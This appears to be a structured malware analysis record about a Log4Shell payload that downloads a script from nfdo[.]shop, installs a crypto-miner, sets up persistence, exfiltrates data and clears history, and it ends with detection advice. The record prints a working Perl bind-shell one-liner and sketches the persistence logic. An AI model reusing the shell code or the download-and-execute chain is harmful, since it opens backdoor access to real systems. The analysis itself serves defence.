package_info.package_name: xExportObject (malicious Java class delivered via Log4Shell)
package_info.package_manager: Custom delivery via JNDI/LDAP (not a public package manager)
package_info.why_malicious: The entire package is designed to exploit the Log4Shell vulnerability by enabling remote code execution through JNDI/LDAP injection, downloading and executing additional malicious payloads, establishing persistence, exfiltrating system data, and maintaining backdoor access. All code is purpose-built for initial compromise, post-exploitation, and ongoing attacker control.

execution_context.file_location: xExportObject.class (delivered via LDAP/JNDI to vulnerable Java process)

malicious_snippets.code_behavior: At exploit-time, the code executes system commands to download a remote shell script via curl or wget, writes it to /tmp/lte, makes it executable, and runs it, resulting in arbitrary code execution and enabling further compromise.

malice_analysis.why_suspicious: The code is executed as a result of a remote JNDI/LDAP call, immediately downloads and executes a remote script from an untrusted domain, and uses both curl and wget for redundancy, which is a common attacker tactic to ensure payload delivery.
malice_analysis.violated_expectations: A legitimate Java class loaded via JNDI should not execute arbitrary system commands, download remote scripts, or invoke shell commands. Such behavior is never expected in standard JNDI object factories.
malice_analysis.similar_legitimate_use: Automated deployment or update agents may download and execute scripts, but never in this context or via JNDI/LDAP injection, and not without explicit user or administrative action.
key_indicators: Use of Runtime.getRuntime().exec for direct system command execution
Downloading and executing remote code from untrusted sources (nfdo[.]shop)
Redundant use of both curl and wget to maximize payload delivery success
Execution triggered by JNDI/LDAP injection, not by user or application logic
Immediate execution of downloaded script without validation

# (Persistence setup)
if [ "$EUID" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
  # systemd service setup
else
  # cron job setup
fi
# (Reverse shell setup)
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(985,INADDR_ANY));listen(S,SOMAXCONN);for(;accept(C,S);){while (<C>){if(/sockaddr/){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");system("/bin/sh -i");close(STDIN);close(STDOUT);close(STDERR);close(C);}}}'

malicious_snippets.code_behavior: At runtime, the script collects system information, downloads and configures a crypto-miner, establishes persistence via systemd or cron, sets up multiple reverse shells (including encrypted channels), exfiltrates system data via HTTP POST, and erases traces by clearing bash history.

malice_analysis.why_suspicious: The script chains together multiple attacker behaviors: system reconnaissance, crypto-miner deployment, persistence establishment, multiple backdoor setups, data exfiltration, and anti-forensics. The use of obfuscation, multiple persistence methods, and encrypted reverse shells is highly indicative of coordinated malicious activity.
malice_analysis.violated_expectations: A legitimate script should not perform all these actions in a single execution flow, nor should it establish unauthorized persistence, deploy crypto-miners, set up reverse shells, or exfiltrate data to external servers.
malice_analysis.similar_legitimate_use: Some system management scripts may collect system info or set up services, but not in this combination, nor with exfiltration, backdoors, or anti-forensic measures.
key_indicators: Obfuscated payloads and use of base64 encoding to hide malicious content
Downloading and executing remote binaries (XMRig miner) from nfdo[.]shop

Multiple reverse shell listeners (Perl, netcat, GPG-encrypted) for remote access
Reconnaissance and exfiltration of system data to attacker-controlled server (nfdo[.]shop/fanfic.php)
Clearing bash history and self-deletion for defense evasion

detection_knowledge.how_to_detect: Monitor for Java processes making outbound LDAP/JNDI requests to untrusted domains, followed by child process creation involving curl, wget, or bash. Flag downloads and execution of files in /tmp or other unusual locations. Detect persistence mechanisms (systemd, cron) referencing unknown binaries such as componist or lte. Alert on reverse shell activity (Perl, netcat, GPG) on non-standard ports and exfiltration attempts to known malicious domains. Correlate with bash history clearing and self-deleting scripts for defense evasion. Combine these indicators to identify multi-stage exploitation and post-exploitation activity.
